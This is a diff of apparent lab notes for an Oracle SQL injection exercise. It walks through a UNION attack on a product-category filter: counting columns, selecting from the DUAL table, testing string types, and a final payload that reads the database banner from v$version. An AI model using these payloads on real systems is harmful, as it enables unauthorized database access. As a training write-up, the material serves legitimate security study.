@@ -1,36 +1,44 @@
-LAB 3
+[+]LAB-03
+SQL injection attack, querying the database type and version on Oracle
 Contain sqlinjection in the product category
 
+[+]TYPE OF SQL INJECTION
 Recommended attack - UNION Attack
 
+[+]OBJECTIVE
 GOAL - Display the database version string.
 
-
+[+]STEP-01
 Determining the number of columns.
 [1]' ORDER BY 1--
 [2]' UNION SELECT NULL--
 
-
+[+]STEP-01 RESULT
 There is 2 columns in the database
 
+[+]FINDINGS
 Hint 1
 Application error when query is used without the FROM statement
 
+[+]USE ORACLE DUMMY DUAL TABLE TO SELECT DATA
 ' UNION SELECT NULL FROM DUAL--
+' UNION SELECT NULL,NULL FROM DUAL--
 
-
-Conclusion
+[+]STEP-01 CONCLUSION
 There is two column on the application
 
-
+[+]STEP-02
 Determining Datatype
 ' UNION SELECT NULL,NULL FROM DUAL--
 
+Inserting string data
 '+UNION+SELECT+"ctfsecurity",NULL+FROM+DUAL--
 
-Extracting Database Version
-SELECT banner FROM v$version - '+UNION+SELECT+'CTFSECURITY','OLAJIDE'+FROM+DUAL--
+Extracting ORACLE Database Version
+SELECT banner FROM v$version 
+'+UNION+SELECT+'CTFSECURITY','OLAJIDE'+FROM+DUAL--
 
+[+]FINAL PAYLOAD
 '+UNION+SELECT+banner,NULL+FROM+v$version--
 
 
